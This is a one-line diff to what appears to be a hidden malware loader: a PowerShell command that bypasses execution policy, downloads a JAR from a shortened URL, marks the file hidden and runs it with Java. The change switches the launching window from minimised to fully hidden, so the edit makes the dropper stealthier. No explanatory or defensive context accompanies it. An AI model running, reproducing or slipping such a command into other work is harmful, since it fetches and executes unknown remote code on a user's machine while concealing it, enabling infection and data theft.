@@ -1,1 +1,1 @@
-powershell -nop -ex bypass -c "Start-Process powershell -WindowStyle Minimized -a '-nop -ex bypass -c ""& {$b=''https://tinyurl.com/athsnhra'';$c=''.\a.jar'';(New-Object Net.WebClient).DownloadFile($b,$c);(attrib +h $c);Start-Process java -WindowStyle Minimized -a ''-jar'',$c}""'"
+powershell -nop -ex bypass -c "Start-Process powershell -WindowStyle Hidden -a '-nop -ex bypass -c ""& {$b=''https://tinyurl.com/athsnhra'';$c=''.\a.jar'';(New-Object Net.WebClient).DownloadFile($b,$c);(attrib +h $c);Start-Process java -WindowStyle Minimized -a ''-jar'',$c}""'"
